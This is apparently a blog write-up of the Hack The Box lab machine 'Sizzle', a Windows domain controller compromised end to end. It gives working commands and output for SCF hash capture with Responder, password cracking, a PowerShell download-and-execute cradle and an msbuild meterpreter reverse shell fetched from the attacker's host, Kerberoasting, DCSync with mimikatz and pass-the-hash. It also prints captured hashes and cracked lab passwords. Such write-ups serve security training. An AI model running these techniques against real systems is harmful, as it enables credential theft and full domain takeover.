---
layout: single
title: Sizzle - Hack The Box
excerpt: "Sizzle was an amazing box that requires using some Windows and Active Directory exploitation techniques such as Kerberoasting to get encrypted hashes from Service Principal Names accounts. The privesc involves adding a computer to domain then using DCsync to obtain the NTLM hashes from the domain controller and then log on as Administrator to the server using the Pass-The-Hash technique."
date: 2019-06-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-sizzle/sizzle_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - scf
  - pass-the-hash
  - meterpreter
  - port forwarding
  - winrm
  - kerberoasting
  - responder
---

![](/assets/images/htb-writeup-sizzle/sizzle_logo.png)

Sizzle was an amazing box that requires using some Windows and Active Directory exploitation techniques such as Kerberoasting to get encrypted hashes from Service Principal Names accounts. The privesc involves adding a computer to domain then using DCsync to obtain the NTLM hashes from the domain controller and then log on as Administrator to the server using the Pass-The-Hash technique.

## Summary

- Find a writable share and drop an .scf file to capture hashes for user `Amanda`
- Create a certificate for `Amanda` and log in with WinRM
- Use msbuild trick to execute a meterpreter shell on the server
- Port forward TCP port 88 locally and kerberoast user `mrlky`
- Join a PC on the domain and execute DCsync to get `Administrator` hash
- PSexec with Pass-The-Hash as `Administrator`

## Blog / Tools used

- [https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
- [http://www.hurryupandwait.io/blog/certificate-password-less-based-authentication-in-winrm](http://www.hurryupandwait.io/blog/certificate-password-less-based-authentication-in-winrm)
- [https://jstuyts.github.io/Secure-WinRM-Manual/windows-client-configuration.html](https://jstuyts.github.io/Secure-WinRM-Manual/windows-client-configuration.html)
- Kerberoast
- Mimikatz

### Nmap

### Portscan

As always, Windows boxes have plenty of ports open. One interesting thing here is it seems that the server is a domain controller based on the LDAP and Global Catalog ports being open but we don't see the TCP port 88 for Kerberos being open. That'll cause some issues later on when we get to the Kerberoasting part of the box.

```
# nmap -p- 10.10.10.103
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 16:23 EST
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up (0.025s latency).
Not shown: 65506 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49679/tcp open  unknown
49682/tcp open  unknown
49683/tcp open  unknown
49684/tcp open  unknown
49687/tcp open  unknown
49697/tcp open  unknown
49709/tcp open  unknown
56700/tcp open  unknown
```

### FTP enumeration

Anonymous access is allowed to the FTP server but there is nothing there. Let's move on.

### Web enumeration

On the web site, we only have a picture of some tasty bacon, nothing else.

![](/assets/images/htb-writeup-sizzle/bacon.png)

Dirbusting the site shows a `/cervsrv` directory which is used by the certificate enrollment web service of the Windows Certificate Authority. It is used by clients to request certificates that can be used for applications to authenticate to a server instead of passwords or to complement password authentication.

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -q -u http://10.10.10.103
/Images (Status: 301)
/aspnet_client (Status: 301)
/certenroll (Status: 301)
/images (Status: 301)
```

The enrollment service requires authentication and we don't have credentials for it yet. We'll get back to that service later.

### SMB shares enumeration

To list the SMB shares on the server, we can't use a null session because we get an access denied error.

```
# smbmap -H 10.10.10.103    
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.103...
[+] IP: 10.10.10.103:445        Name: sizzle.htb                                        
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied
```

But if we specify any other user that doesn't exist, it'll open a guest SMB session and we can see the list of shares. The `Department Shares` is readable by guest users so this is our next target.

```
# smbmap -u invaliduser -H 10.10.10.103       
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.103...
[+] IP: 10.10.10.103:445        Name: sizzle.htb                                        
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        CertEnroll                                              NO ACCESS
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY
        NETLOGON                                                NO ACCESS
        Operations                                              NO ACCESS
        SYSVOL                                                  NO ACCESS
```

### Getting the Net-NTLMv2 hash from a user

We can use `smbclient` to log in and look around the share for files of interest.

```
# smbclient -U invaliduser //10.10.10.103/"Department Shares"
Enter HTB\invaliduser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018

                7779839 blocks of size 4096. 2634403 blocks available
```                

In `ZZ_ARCHIVE`, there's a bunch of files with random names:

```
smb: \ZZ_ARCHIVE\> dir
  .                                   D        0  Mon Jul  2 15:32:58 2018
  ..                                  D        0  Mon Jul  2 15:32:58 2018
  AddComplete.pptx                    A   419430  Mon Jul  2 15:32:58 2018
  AddMerge.ram                        A   419430  Mon Jul  2 15:32:57 2018
  ConfirmUnprotect.doc                A   419430  Mon Jul  2 15:32:57 2018
  ConvertFromInvoke.mov               A   419430  Mon Jul  2 15:32:57 2018
  ConvertJoin.docx                    A   419430  Mon Jul  2 15:32:57 2018
  CopyPublish.ogg                     A   419430  Mon Jul  2 15:32:57 2018
  DebugMove.mpg                       A   419430  Mon Jul  2 15:32:57 2018
  DebugSelect.mpg                     A   419430  Mon Jul  2 15:32:58 2018
  DebugUse.pptx                       A   419430  Mon Jul  2 15:32:57 2018
[...]
```

However when we check, they are all identical and only contain null bytes.

```
# xxd AddComplete.pptx |more
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
[...]
```

To make sure they are all identical and that none of them contain something hidden, I checked the md5sum of all the files in the directory. The `6fa74ff6dd88878b4b56092a950035f8` MD5 hash is the same for all the files. This is just a troll/diversion, we can ignore these.

```
# md5sum *
6fa74ff6dd88878b4b56092a950035f8  AddComplete.pptx
6fa74ff6dd88878b4b56092a950035f8  AddMerge.ram
6fa74ff6dd88878b4b56092a950035f8  ConfirmUnprotect.doc
6fa74ff6dd88878b4b56092a950035f8  ConvertFromInvoke.mov
6fa74ff6dd88878b4b56092a950035f8  ConvertJoin.docx
6fa74ff6dd88878b4b56092a950035f8  CopyPublish.ogg
6fa74ff6dd88878b4b56092a950035f8  DebugMove.mpg
6fa74ff6dd88878b4b56092a950035f8  DebugSelect.mpg
[...]
```

After trying a few different things, I noticed that the guest user has write access to the `ZZ_ARCHIVE` and `users\Public` folders:

`dir` output from smbclient after enabling `showacls`, notice the `WRITE_OWNER_ACCESS` and `WRITE_DAC_ACCESS` permissions:

```
type: ACCESS ALLOWED (0) flags: 0x03 SEC_ACE_FLAG_OBJECT_INHERIT  SEC_ACE_FLAG_CONTAINER_INHERIT 
Specific bits: 0x1ff
Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
SID: S-1-1-0
```

The `S-1-1-0` SID is for all users:

> SID: S-1-1-0

> Name: Everyone

> Description: A group that includes all users, even anonymous users and guests. Membership is controlled by the operating system.

From the `users` folder, we can get a list of potential usernames on the box. This could be useful for password spraying if we had a valid password and wanted to try it on different accounts.

```
smb: \users\> dir
  .                                   D        0  Tue Jul 10 17:39:32 2018
  ..                                  D        0  Tue Jul 10 17:39:32 2018
  amanda                              D        0  Mon Jul  2 15:18:43 2018
  amanda_adm                          D        0  Mon Jul  2 15:19:06 2018
  bill                                D        0  Mon Jul  2 15:18:28 2018
  bob                                 D        0  Mon Jul  2 15:18:31 2018
  chris                               D        0  Mon Jul  2 15:19:14 2018
  henry                               D        0  Mon Jul  2 15:18:39 2018
  joe                                 D        0  Mon Jul  2 15:18:34 2018
  jose                                D        0  Mon Jul  2 15:18:53 2018
  lkys37en                            D        0  Tue Jul 10 17:39:04 2018
  morgan                              D        0  Mon Jul  2 15:18:48 2018
  mrb3n                               D        0  Mon Jul  2 15:19:20 2018
  Public                              D        0  Wed Sep 26 01:45:32 2018
```

Because we have write access to the SMB share, we can try to use the SCF (Shell Command Files) technique to make a user connect back to us and get the NTLMv2 hash. This of course assumes that there is some automated script simulating an active user on the box. Fortunately, I did the Offshore pro labs a few days prior to starting that box so I remembered that the SCF trick was used there and because Sizzle is created by the same person I figured he probably used the same trick here.

First, we need to create an .scf file that contains a link to an icon file hosted on our Kali machine. The file doesn't need to exist, we just need to point to our IP so we can get the NTLMv2 hash. Normally we would need to start the file with something like the `@` character so the file will appear at the top of the directory listing when the user browses to it but since there are no other files in that `Public` directory we could use any filename.

Contents of `@pwn.scf`:
```
[Shell]
Command=2
IconFile=\\10.10.14.23\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

File is uploaded to the `Public` folder.

```
# smbclient -U invaliduser //10.10.10.103/"Department Shares"    
Try "help" to get a list of possible commands.
smb: \> cd users\public
smb: \users\public\> put @pwn.scf
putting file @pwn.scf as \users\public\@pwn.scf (1.0 kb/s) (average 0.9 kb/s)
```

Then `responder` is used to catch the connection from the user and get the hash. This takes a few minutes, the simulated user script is probably running in a scheduler task on the server side.

```
# responder -I tun0
                                         __
[...]

[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
[SMBv2] NTLMv2-SSP Username : HTB\amanda
[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:4c8aa1ec2c7628d2:7DE63D37AD8DE986ADA1831A64714556:0101000000000000C0653150DE09D2010F30883C4603F679000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000050A6C12D738CB3CD4BB39C28BAAB3AB2BE796E70B0A3A413F02F1F6D8E5C81690A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003300000000000000000000000000
```

So we now have an NTLMv2 hash, which we'll need to crack since we can't use that type of hash for Pass-The-Hash. With John the Ripper, we use the rockyou.txt wordlist and are able to crack the password.

```
# john -w=/usr/share/wordlists/rockyou.txt --fork=4 amanda.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1 0g 0:00:00:06 DONE (2019-01-15 22:38) 0g/s 427278p/s 427278c/s 427278C/s ANYBODY
2 1g 0:00:00:06 DONE (2019-01-15 22:38) 0.1492g/s 425960p/s 425960c/s 425960C/s Ashare1972
4 0g 0:00:00:06 DONE (2019-01-15 22:38) 0g/s 427509p/s 427509c/s 427509C/s ANALEIGH2113
Waiting for 3 children to terminate
3 0g 0:00:00:06 DONE (2019-01-15 22:38) 0g/s 427576p/s 427576c/s 427576C/s AMOPMINHACASA
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Password is: `Ashare1972`

### Getting an initial foothold on the server

The next thing I tried were psexec and wmiexec, none of them worked for this user. We also don't have any additional privileges on the SMB share, nor can we access anything else on the FTP server.

Remember that web enrollment certificate page for earlier? Let's go back to it and see if we can log in with Amanda's credentials.

![](/assets/images/htb-writeup-sizzle/Screenshot_3.png)

Nice, we are now able to log in and we can request a certificate that we will use to authenticate to the server using WinRM. I switched to a Windows VM at that point because I find using WinRM from within Windows Powershell works better than Kali.

A Certificate Signing Request (CSR) is created with the following commands (both CSR and private keys are generated):

```
PS C:\Users\labuser> openssl req -nodes -newkey rsa:2048 -keyout amanda.key -out amanda.csr
Generating a RSA private key
.......+++++
.....................................................+++++
writing new private key to 'amanda.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:Amanda
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Then on the certificate web enrollment page, we can copy/paste the content of the CSR.

![](/assets/images/htb-writeup-sizzle/Screenshot_4.png)

This generates a signed certificate that we will download.

The key and signed certificate need to be combined so they can be imported in the Windows certificate store. We take the `amanda.key` that contains the private key and combine it with `certnew.cer` which is the signed certificate, and the output is saved to `certificate.pfx`:

```
PS C:\Users\labuser> openssl pkcs12 -export -out certificate.pfx -inkey amanda.key -in certnew.cer
Enter Export Password:
Verifying - Enter Export Password:
```

The .pfx file is then imported into the Windows cert store. Note that once the certificate is imported, we need to note the thumbprint ID since this is required to log in with WinRM.

The certificate part is ready, now we'll setup the WinRM service and add all hosts to the TrustHosts (we'll disable certificate validation when we connect anyways).

![](/assets/images/htb-writeup-sizzle/Screenshot_8.png)

```
PS C:\Windows\system32> winrm quickconfig
WinRM is not set up to receive requests on this machine.
The following changes must be made:

Start the WinRM service.
Set the WinRM service type to delayed auto start.

Make these changes [y/n]? y

WinRM has been updated to receive requests.

WinRM service type changed successfully.
WinRM service started.
WSManFault
    Message
        ProviderFault
            WSManFault
                Message = WinRM firewall exception will not work since one of the network connection types on this machine is set to Public. Change the network connection type to either Domain or Private and try again.

Error number:  -2144108183 0x80338169
WinRM firewall exception will not work since one of the network connection types on this machine is set to Public. Change the network connection type to either Domain or Private and try again.
PS C:\Windows\system32> get-service winrm

Status   Name               DisplayName
------   ----               -----------
Running  winrm              Windows Remote Management (WS-Manag...

PS C:\tmp> winrm set winrm/config/client '@{TrustedHosts="*"}'
Client
    NetworkDelayms = 5000
    URLPrefix = wsman
    AllowUnencrypted = false
    Auth
        Basic = false
        Digest = false
        Kerberos = false
        Negotiate = true
        Certificate = true
        CredSSP = false
    DefaultPorts
        HTTP = 5985
        HTTPS = 5986
    TrustedHosts = *  
```

We don't need to check the CRL and do certificate validation because this is an HTB box, so we can use session options to disable this. 

```
PS C:\Users\labuser> $sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
PS C:\Users\labuser> enter-pssession -ComputerName 10.10.10.103 -SessionOption $sessionOption -CertificateThumbprint 7d8f7b5cbdf16a19a00f0088f1692734b0c3a850
[10.10.10.103]: PS C:\Users\amanda\Documents> hostname
sizzle
[10.10.10.103]: PS C:\Users\amanda\Documents> whoami
htb\amanda
[10.10.10.103]: PS C:\Users\amanda\Documents>
```

Good, we now have a foothold on the server using WinRM.

### Escalating to the next user

Amanda doesn't have `user.txt` in her Desktop, we need to get access as another user next.

Listing users on the box, we notice two additional users: `sizzler` and `mrlky`:
```
[10.10.10.103]: PS C:\Users\amanda> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            amanda                   DefaultAccount
Guest                    krbtgt                   mrlky
sizzler
The command completed with one or more errors.
```

When we check the privileges Amanda has, we notice she can add workstations to the domain with `SeMachineAccountPrivilege`. 
```
[10.10.10.103]: PS C:\Users\amanda\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

PowerShell constrained language mode is enabled and prevents us from loading additional modules.
```
[10.10.10.103]: PS C:\Users\amanda\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

[10.10.10.103]: PS C:\Users\amanda> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/PowerView.ps1')
New-Object : Cannot create type. Only core types are supported in this language mode.
At line:1 char:6
+ IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/Pow ...
+      ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException
    + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand
```

We can bypass this by using PowerShell version 2 and we can use PowerView to find an account with an SPN that we will use to Kerberoast:
```
[10.10.10.103]: PS C:\Users\amanda\Documents> powershell -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/PowerView.ps1'); get
-domainuser -spn"

[...]

objectsid             : S-1-5-21-2379389067-1826974543-3574127760-1603
samaccounttype        : USER_OBJECT
primarygroupid        : 513
instancetype          : 4
badpasswordtime       : 7/12/2018 12:22:42 AM
memberof              : {CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL, CN=Users,CN=Builti
                        n,DC=HTB,DC=LOCAL}
whenchanged           : 7/12/2018 4:45:59 AM
badpwdcount           : 0
useraccountcontrol    : NORMAL_ACCOUNT
name                  : mrlky
codepage              : 0
distinguishedname     : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
logoncount            : 68
lastlogon             : 7/12/2018 10:23:50 AM
serviceprincipalname  : http/sizzle
usncreated            : 13068
dscorepropagationdata : {7/7/2018 5:28:35 PM, 1/1/1601 12:00:01 AM}
lastlogontimestamp    : 7/10/2018 2:14:51 PM
cn                    : mrlky
pwdlastset            : 7/10/2018 2:08:09 PM
objectguid            : 4bd46301-3362-4eac-9374-dc5cb0b6225d
whencreated           : 7/3/2018 3:52:48 PM
usercertificate       :
[...]
countrycode           : 0
samaccountname        : mrlky
objectclass           : {top, person, organizationalPerson, user}
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
accountexpires        : 12/31/1600 7:00:00 PM
usnchanged            : 53342
lastlogoff            : 12/31/1600 7:00:00 PM
logonhours            : {255, 255, 255, 255...}
```

Kerberoasting from the WinRM session doesn't work. I think it's because our user is authenticated with WinRM instead of Kerberos. Not too sure of the specifics here but it has to do with the type of authentication used.
```
[10.10.10.103]: PS C:\Users\amanda\Documents> powershell -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/PowerView.ps1'); inv
oke-kerberoast"
WARNING: [Get-DomainSPNTicket] Error requesting ticket for SPN 'http/sizzle' from user
'CN=mrlky,CN=Users,DC=HTB,DC=LOCAL' : Exception calling ".ctor" with "1" argument(s): "The
NetworkCredentials provided were unable to create a Kerberos credential, see inner execption for
details."
```

We also can't kerberoast directly from our Kali machine because TCP Port 88 has been intentionally blocked by the box creator.
```
# kerberoast spnroast htb.local/amanda:Ashare1972@10.10.10.103 -u mrlky -r htb.local
2019-01-18 13:58:16,096 minikerberos ERROR    Failed to get TGT ticket! Reason: [Errno 110] Connection timed out
Traceback (most recent call last):
```

What we can do is get a meterpreter shell on the box and do a port forward so we can access TCP port 88 through the meterpreter tunnel. Defender is enabled and will block any attempt at uploading a straight binary to the server. I used GreatSCT for AV evasion with the msbuild option to bypass AppLocker.

Generating the payload with GreatSCR:
```
Payload: msbuild/meterpreter/rev_tcp selected

Required Options:

Name              Value     Description
----              -----     -----------
DOMAIN            X         Optional: Required internal domain
EXPIRE_PAYLOAD    X         Optional: Payloads expire after "Y" days
HOSTNAME          X         Optional: Required system hostname
INJECT_METHOD     Virtual   Virtual or Heap
LHOST                       IP of the Metasploit handler
LPORT             4444      Port of the Metasploit handler
PROCESSORS        X         Optional: Minimum number of processors
SLEEP             X         Optional: Sleep "Y" seconds, check if accelerated
TIMEZONE          X         Optional: Check to validate not in UTC
USERNAME          X         Optional: The required user account

 Available Commands:

  back          Go back
  exit          Completely exit GreatSCT
  generate      Generate the payload
  options       Show the shellcode's options
  set           Set shellcode option

[msbuild/meterpreter/rev_tcp>>] set LHOST 10.10.14.23

[msbuild/meterpreter/rev_tcp>>] set LPORT 443

[msbuild/meterpreter/rev_tcp>>] generate
```

Downloading to the server and executing with msbuild.exe (make sure to use 32 bits since payload is 32 bits):
```
[10.10.10.103]: PS C:\Users\amanda\Documents> Invoke-WebRequest -Uri "http://10.10.14.23/payload.xml" -OutFile payload.xml

PS C:\Users\amanda\Documents> C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
Microsoft (R) Build Engine version 4.6.1586.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 1/18/2019 9:40:14 AM.
PS C:\Users\amanda\Documents> 
```

I now have a meterpreter session.
```
msf5 exploit(multi/handler) > 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (179808 bytes) to 10.10.10.103
[*] Meterpreter session 4 opened (10.10.14.23:4444 -> 10.10.10.103:60672) at 2019-01-18 14:48:41 -0500

```

Then I added a local port forward so the connection to my Kali machine on TCP port 88 will be tunneled and connected to the remote server on the same port:
```
meterpreter > portfwd add -l 88 -p 88 -r 127.0.0.1
[*] Local TCP relay created: :88 <-> 127.0.0.1:88
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local       Remote        Direction
   -----  -----       ------        ---------
   1      0.0.0.0:88  127.0.0.1:88  Forward

1 total active port forwards.
```

Now we can kerberoast through our forwarded port but it still fails because of the clock drift between our host and the server:
```
# kerberoast spnroast htb.local/amanda:Ashare1972@127.0.0.1 -u mrlky -r htb.local
2019-01-18 14:53:46,934 minikerberos ERROR    Failed to get TGT ticket! Reason: The clock skew is too great Error Core: 37
Traceback (most recent call last):
```

I setup my Kali machine to sync to the target box using NTP and I got rid of the clock drift that way.


Now we're able to kerberoast and get the hash for `mrlky`:
```
# kerberoast spnroast htb.local/amanda:Ashare1972@127.0.0.1 -u mrlky -r htb.local
$krb5tgs$23$*mrlky$HTB.LOCAL$spn*$dffa2597262b36b9980bd934bb60ee00$1a0c48f2e50a8e3654f98c0231454e98b711eb8b41e19dc53595e9e71744795a26e04a6d2d320d253ac72efe7ceaebe2a7bda41664ad48a1b9834749690dc493b15033aa670542851bb9d2be388e5c90143f09f31908dd8dcd03179b2cbf35cbca5b8f4f85d7c029c6fe311694ddc6763631a54b070e5f304070397818c3221498a19e5d87168fa11ac7e8a82c715a974a89cad01e15c463ee394c1c175e7f9e8c45fb66576b5c308fd91fca893c1e969635a97bfd7775aa15f57e3c5e1d2effb0cacd9a249ae2e3d4d000ce49e079cf5e4d065f63583615ad75bb76e035d2b67ae85b096fa357e087a421eab77beae5f283034fedfa0ac7c750334bd11062eb5c4297df1a4f4a09fcbe31d64a4003f214262f309583596f2ec15bb9299f8b23c57cba2edd14a4aab2df987f4a0268b783ae40802b87ef92f8fbdb0a38af5987f0b492520c9f5636149f3fe51bc0117c34bed1549cdf09443472533102a35006c5dad7e701d7565b0a2e7bd9407fb976d47bf9d0a95ed9ef333b39e17be825e8b1e9b64f186cefe6c8a28628c8c7da481f85dea018ad3b556b88a966bb3086da54e977b82999bfe69f4580b08f10bf074231fe079ac9f3fa5db4e9c505c2f737f8da7f75bf1b6984fd6dfeb54627474ea4272709c1f8de04a8171fe10da015d2f16e22021fc50ae229838e44d927aa2b431e7faa360da09fb6ba3fcdf0b16f4536d0263f86e940e60c2f347dcc9d3a53f68968d9550d7b35de4015e493346e9943f717f177b4b613b3b34150bd4931dffc55a5d5c534ee3c1c8ff72ea9ecea2799764032907c2a72977cefe0770c4321a10a821195adb4a139127d3c109bdc97224c7e1ff87a0291904f3152d7de0ed069e43daa1e35a21ddf3746c5cb6889b6c442c9902289ae0d4b066fc40c1cc39085116f2924f4f7d023f5ffaa0517c198b413f808e2b53ec1778f8180b39fa370bc77823d316afb240e270b1286d7205d921b7570a72f0c42d789504e586e5569d7b3a9783193765364f1440f21eef0e744b401673762d1dd30289f6fef9d846022c043dedf38483b9850bcb5d8bfb767df4ab5e7e194406ef05a605b4727c4399a58d97262b9eff1dc6a7ab0645ee0cd93d2af0e402e548884d7fe07966ceb78e39ca46eb7cb11964f14b07f7922874716c1bfe12ccf185d92e3d9cea81232d684efaec22398a18c94cb7d71f69ec4ba6296c8a46db94cae2b45a3b587a054115f73ee36ced05e0f
INFO:root:Kerberoast complete
```

Luckily for us, the password is weak and we can crack it:
```
# ~/JohnTheRipper/run/john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)
2 1g 0:00:00:06 DONE (2019-01-18 10:04) 0.1543g/s 430834p/s 430834c/s 430834C/s Footie123..Foh9iyd=,r^j
4 0g 0:00:00:08 DONE (2019-01-18 10:04) 0g/s 437842p/s 437842c/s 437842C/s   cxz..*7¡Vamos!
3 0g 0:00:00:08 DONE (2019-01-18 10:04) 0g/s 436776p/s 436776c/s 436776C/s  0125457423 .a6_123
1 0g 0:00:00:08 DONE (2019-01-18 10:04) 0g/s 436246p/s 436246c/s 436246C/s  Jakekovac3.ie168
Waiting for 3 children to terminate
Session completed
```

Password is: `Football#7`

I went through the same process of generating a certificate for `mrkly` through the web enrollment page. I was then able to log in with WinRM as user `mrlky` and get the user flag:
```
PS C:\Users\labuser> $sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
PS C:\Users\labuser> enter-pssession -ComputerName 10.10.10.103 -SessionOption $sessionOption -CertificateThumbprint 4c7
c243d0a6b2e9c9b1316fbbc8fa5663cebec1c
[10.10.10.103]: PS C:\Users\mrlky.HTB\Documents> type c:\users\mrlky\desktop\user.txt
a6ca1f....
```

### Privesc

For this next part, we'll add our Windows 10 VM to the domain since both `amanda` and `mrlky` have the necessary privileges to add machines.

```
PS C:\Windows\system32> add-computer -domainname htb.local

cmdlet Add-Computer at command pipeline position 1
Supply values for the following parameters:
Credential
WARNING: The changes will take effect after you restart the computer DESKTOP-PL1DUQJ.
PS C:\Windows\system32>
```

After a reboot, we're able to log in to the Win 10 VM with those two domain accounts.

Let's run SharpHound to pull the data from AD and import it into BloodHound:
```
PS C:\Users\mrlky\documents> .\sharphound -c All
Initializing BloodHound at 10:51 AM on 1/18/2019
Resolved Collection Methods to Group, LocalGroup, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM
Starting Enumeration for HTB.LOCAL
Status: 62 objects enumerated (+62 15.5/s --- Using 48 MB RAM )
Finished enumeration for HTB.LOCAL in 00:00:04.0273869
0 hosts failed ping. 0 hosts timedout.

Compressing data to .\20190118105148_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!
```

![](/assets/images/htb-writeup-sizzle/bloodhound.png)

We can see here that `mrlky` has `GetChanges` and `GetChangesAll` privileges on the domain so he can DCsync and get hashes for all the users

Let's try that for the administrator:
```
mimikatz # lsadump::dcsync /user:administrator
[DC] 'HTB.LOCAL' will be the domain
[DC] 'sizzle.HTB.LOCAL' will be the DC server
[DC] 'administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 7/12/2018 9:32:41 AM
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267
```  

Now that we have the administrator NTLM hash, we can log in with pass-the-hash to the server and grab the final flag:
```
# /usr/share/doc/python-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

C:\>type c:\users\administrator\desktop\root.txt
91c584<redacted>
```